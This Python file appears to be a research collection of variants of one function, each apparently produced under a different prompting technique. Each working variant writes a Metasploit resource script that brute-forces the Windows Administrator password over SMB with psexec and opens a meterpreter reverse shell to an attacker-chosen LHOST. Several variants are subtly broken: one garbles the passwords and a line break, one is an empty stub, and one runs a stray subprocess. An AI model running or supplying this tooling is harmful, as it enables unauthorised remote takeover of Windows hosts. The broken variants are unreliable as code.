import sys
import codecs
import os
import re

def ground_truth_code_smbBrute(configFile, tgtHost, passwdFile, lhost, lport):
    username = 'Administrator'
    pF = open(passwdFile, 'r')
    for password in pF.readlines():
        password = password.strip('\n').strip('\r')
        configFile.write('use exploit/windows/smb/psexec\n')
        configFile.write('set SMBUser ' + str(username) + '\n')
        configFile.write('set SMBPass ' + str(password) + '\n')
        configFile.write('set RHOST ' + str(tgtHost) + '\n')
        configFile.write('set payload ' + 'windows/meterpreter/reverse_tcp\n')
        configFile.write('set LPORT ' + str(lport) + '\n')
        configFile.write('set LHOST ' + lhost + '\n')
        configFile.write('exploit -j -z\n')

import json
def persona_smbBrute(configFile, tgtHost, passwdFile, lhost, lport):
    with open(passwdFile, 'r') as pw_file:
        passwords = [line.strip() for line in pw_file.readlines()]
    with open(configFile, 'a') as cfg:
        for password in passwords:
            cfg.write('use exploit/windows/smb/psexec\n')
            cfg.write('set SMBUser Administrator\n')
            cfg.write('set SMBPass ' + password + '\n')
            cfg.write('set RHOST ' + tgtHost + '\n')
            cfg.write('set payload windows/meterpreter/reverse_tcp\n')
            cfg.write('set LPORT ' + str(lport) + '\n')
            cfg.write('set LHOST ' + lhost + '\n')
            cfg.write('exploit -j -z\n')

def template_smbBrute(configFile, tgtHost, passwdFile, lhost, lport):
    try:
        with open(passwdFile, 'r') as file:
            passwords = [line.strip() for line in file.readlines()]
        with open(configFile, 'w') as file:
            for password in passwords:
                file.write('use exploit/windows/smb/psexec\n')
                file.write('set SMBUser Administrator\n')
                file.write('set SMBPass ' + password + '\n')
                file.write('set RHOST ' + tgtHost + '\n')
                file.write('set payload windows/meterpreter/reverse_tcp\n')
                file.write('set LPORT ' + str(lport) + '\n')
                file.write('set LHOST ' + lhost + '\n')
                file.write('exploit -j -z\n')
    except Exception as e:
        print(f'An error occurred: {e}')

def question_refinement_smbBrute(configFile, tgtHost, passwdFile, lhost, lport):
    import json

    with open(passwdFile, 'r') as pf:
        passwords = [line.strip() for line in pf if line.strip()]

    configs = []

    for password in passwords:
        config_line = (
            "use exploit/windows/smb/psexec\n"
            "set SMBUser Administrator\n"
            f"set SMBPass {password}\n"
            f"set RHOST {tgtHost}\n"
            "set payload windows/meterpreter/reverse_tcp\n"
            f"set LPORT {lport}\n"
            f"set LHOST {lhost}\n"
            "exploit -j -z\n"
        )
        configs.append(config_line)
    final_config = json.dumps({'configs': configs})
    with open(configFile, 'w') as cf:
        cf.write(final_config)

def alternative_approaches_smbBrute(configFile, tgtHost, passwdFile, lhost, lport):
    with open(configFile, 'a') as f:
        for password in open(passwdFile).read().splitlines():
            password = password.strip()
            if password:
                f.write('use exploit/windows/smb/psexec\n')
                f.write('set SMBUser Administrator\n')
                f.write(f'set SMBPass {password}\n')
                f.write(f'set RHOST {tgtHost}\n')
                f.write('set payload windows/meterpreter/reverse_tcp\n')
                f.write(f'set LPORT {lport}\n')
                f.write(f'set LHOST {lhost}\n')
                f.write('exploit -j -z\n')

def context_manager_smbBrute(configFile, tgtHost, passwdFile, lhost, lport):
    with open(passwdFile, 'r') as pf, open(configFile, 'a') as cf:
        for password in pf:
            password = password.strip()
            cf.write('use exploit/windows/smb/psexec\n')
            cf.write('set SMBUser Administrator\n')
            cf.write('set SMBPass ' + password + '\n')
            cf.write('set RHOST ' + tgtHost + '\n')
            cf.write('set payload windows/meterpreter/reverse_tcp\n')
            cf.write('set LPORT ' + str(lport) + '\n')
            cf.write('set LHOST ' + lhost + '\n')
            cf.write('exploit -j -z\n')

def iterative_prompting_3_smb_brute(config_file, tgt_host, passwd_file, lhost, lport):
    if not all(isinstance(arg, str) and arg for arg in [config_file, tgt_host, passwd_file, lhost, lport]):
        raise ValueError('All arguments must be non-empty strings')
    try:
        with open(passwd_file, 'r') as file:
            passwords = [line.strip() for line in file.readlines() if line.strip()]
            if not passwords:
                raise ValueError('The password file is empty or contains only whitespace')
    except (IOError, ValueError, OSError) as e:
        raise Exception(f'Error opening or reading password file: {e}')
    try:
        with open(config_file, 'a') as config:
            for password in passwords:
                config.write('use exploit/windows/smb/psexec\n')
                config.write('set SMBUser Administrator\n')
                config.write('set SMBPass {}'.format(password) + '\n')
                config.write('set RHOST {}\n'.format(tgt_host) if tgt_host.startswith('http://') else 'set RHOST {}\n'.format(tgt_host))
                config.write('set payload windows/meterpreter/reverse_tcp\n')
                config.write('set LPORT {}\n'.format(lport) if lport.isdigit() else 'set LPORT {}\n'.format(lport))
                config.write('set LHOST {}\n'.format(lhost) if lhost.startswith('http://') else 'set LHOST {}\n'.format(lhost))
                config.write('exploit -j -z\n')
    except IOError as e:
        raise Exception(f'Error writing to config file: {e}')
    import subprocess
    try:
        process = subprocess.run(['echo', 'Done'], check=True, capture_output=True, text=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        if process.returncode != 0:
            raise RuntimeError('System command execution failed')
        print(process.stdout)
    except subprocess.CalledProcessError as e:
        raise RuntimeError(f'Error executing system command: {e.stderr}')

def iterative_prompting_4_smb_brute(config_file, tgt_host, passwd_file, lhost, lport):
    if not all(isinstance(arg, str) for arg in [config_file, tgt_host, passwd_file, lhost, lport]):
        raise ValueError('All arguments must be of type str.')
    try:
        with open(config_file, 'w') as config_file_handle, open(passwd_file) as pwd_handle:
            for password in pwd_handle:
                password = password.strip()
                subst = str.maketrans('abcdefghijklmnopqrstuvwxyz', 'zyxwvutsrqponmlkjihgfedcba')
                obscured_password = password.translate(subst)
                config_file_content = ('use exploit/windows/smb/psexec\n' \
                                       f'set SMBUser Administrator' \
                                       f'set SMBPass {obscured_password}\n' \
                                       f'set RHOST {tgt_host}\n' \
                                       f'set payload windows/meterpreter/reverse_tcp\n' \
                                       f'set LPORT {lport}\n' \
                                       f'set LHOST {lhost}\n' \
                                       f'exploit -j -z\n')
                config_file_handle.write(config_file_content)
    except (IOError, Exception) as e:
        if isinstance(e, IOError):
            print(f'An I/O error occurred: {e.strerror}')
        else:
            print(f'An unexpected error occurred: {e}')

def iterative_prompting_5_smbBrute(configFile, tgtHost, passwdFile, lhost, lport):
    if not (isinstance(configFile, str) and isinstance(tgtHost, str) and isinstance(passwdFile, str) and isinstance(lhost, str) and isinstance(lport, str)):
        raise ValueError()

def few_shots_prompting_smbBrute(configFile, tgtHost, passwdFile, lhost, lport):
    with open(passwdFile, 'r') as f:
        passwords = [line.strip() for line in f.readlines()]
    with open(configFile, 'a') as f:
        for password in passwords:
            f.write('use exploit/windows/smb/psexec\n')
            f.write('set SMBUser Administrator\n')
            f.write(f'set SMBPass {password}\n')
            f.write(f'set RHOST {tgtHost}\n')
            f.write('set payload windows/meterpreter/reverse_tcp\n')
            f.write(f'set LPORT {lport}\n')
            f.write(f'set LHOST {lhost}\n')
            f.write('exploit -j -z\n')

def cot_prompting_smbBrute(configFile, tgtHost, passwdFile, lhost, lport):
    with open(passwdFile, 'r') as file:
        passwords = [line.strip() for line in file]
    with open(configFile, 'w') as file:
        for password in passwords:
            file.write('use exploit/windows/smb/psexec\n')
            file.write('set SMBUser Administrator\n')
            file.write('set SMBPass ' + password + '\n')
            file.write('set RHOST ' + tgtHost + '\n')
            file.write('set payload windows/meterpreter/reverse_tcp\n')
            file.write('set LPORT ' + str(lport) + '\n')
            file.write('set LHOST ' + lhost + '\n')
            file.write('exploit -j -z\n')

import os
def fact_check_list_smbBrute(configFile, tgtHost, passwdFile, lhost, lport):
    with open(passwdFile, 'r') as pwd_file:
        passwords = [line.strip('\n') for line in pwd_file.readlines()]
    with open(configFile, 'a') as config_file:
        for password in passwords:
            config_file.write('use exploit/windows/smb/psexec\n')
            config_file.write('set SMBUser Administrator\n')
            config_file.write('set SMBPass ' + password + '\n')
            config_file.write('set RHOST ' + tgtHost + '\n')
            config_file.write('set payload windows/meterpreter/reverse_tcp\n')
            config_file.write('set LPORT ' + str(lport) + '\n')
            config_file.write('set LHOST ' + lhost + '\n')
            config_file.write('exploit -j -z\n')
            config_file.write('\n')

def not_interactive_mix_smbBrute(configFile, tgtHost, passwdFile, lhost, lport):
    try:
        with open(passwdFile, 'r') as password_file:
            passwords = [line.strip('') for line in password_file.readlines()]
    except Exception as e:
        print(f"Error reading password file: {e}")
        return
    try:
        with open(configFile, 'a') as config:
            for password in passwords:
                config.write('use exploit/windows/smb/psexec\n')
                config.write('set SMBUser Administrator\n')
                config.write(f'set SMBPass {password}\n')
                config.write(f'set RHOST {tgtHost}\n')
                config.write(f'set payload windows/meterpreter/reverse_tcp\n')
                config.write(f'set LPORT {lport}\n')
                config.write(f'set LHOST {lhost}\n')
                config.write('exploit -j -z\n')
                config.write('\n')
    except Exception as e:
        print(f"Error writing to config file: {e}")

def baseline_smbBrute(configFile, tgtHost, passwdFile, lhost, lport):
    with open(passwdFile, 'r') as f:
        passwords = [line.strip() for line in f.readlines()]
    with open(configFile, 'w') as f:
        for password in passwords:
            f.write('use exploit/windows/smb/psexec\n')
            f.write('set SMBUser Administrator\n')
            f.write('set SMBPass ' + str(password) + '\n')
            f.write('set RHOST ' + str(tgtHost) + '\n')
            f.write('set payload windows/meterpreter/reverse_tcp\n')
            f.write('set LPORT ' + str(lport) + '\n')
            f.write('set LHOST ' + lhost + '\n')
            f.write('exploit -j -z\n')

